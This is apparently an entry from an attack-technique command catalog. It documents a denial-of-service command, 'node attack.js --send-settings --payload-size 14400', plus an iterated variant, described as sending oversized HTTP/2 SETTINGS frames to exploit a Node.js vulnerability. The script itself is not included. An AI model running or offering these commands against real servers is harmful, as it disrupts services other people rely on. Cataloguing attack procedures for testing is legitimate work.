---
id: cmd-uuid-3
data: node attack.js --send-settings --payload-size 14400
tags:
  - dos
  - frames
type: command
output: SETTINGS frames sent on all connections
executor: bash
platforms:
  - Linux
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.660Z'
verified: false
validated: true
submitted: true
---
# node-send-settings

## Command

```bash
node attack.js --send-settings --payload-size 14400
```

## Description

Sends oversized HTTP/2 SETTINGS frames using the attack script to exploit the Node.js vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--send-settings` | Flag to trigger SETTINGS frame transmission | Yes |
| `--payload-size` | Size of the frame payload in bytes | Yes |

## Examples

### Basic Usage

```bash
node attack.js --send-settings --payload-size 14400
```

### Advanced Usage

```bash
node attack.js --send-settings --payload-size 14400 --iterations 10
```

## Expected Output

Confirmation of frames sent; no errors if connections are active.

## Related

- [[procedures/Send-Large-SETTINGS-Frames]]
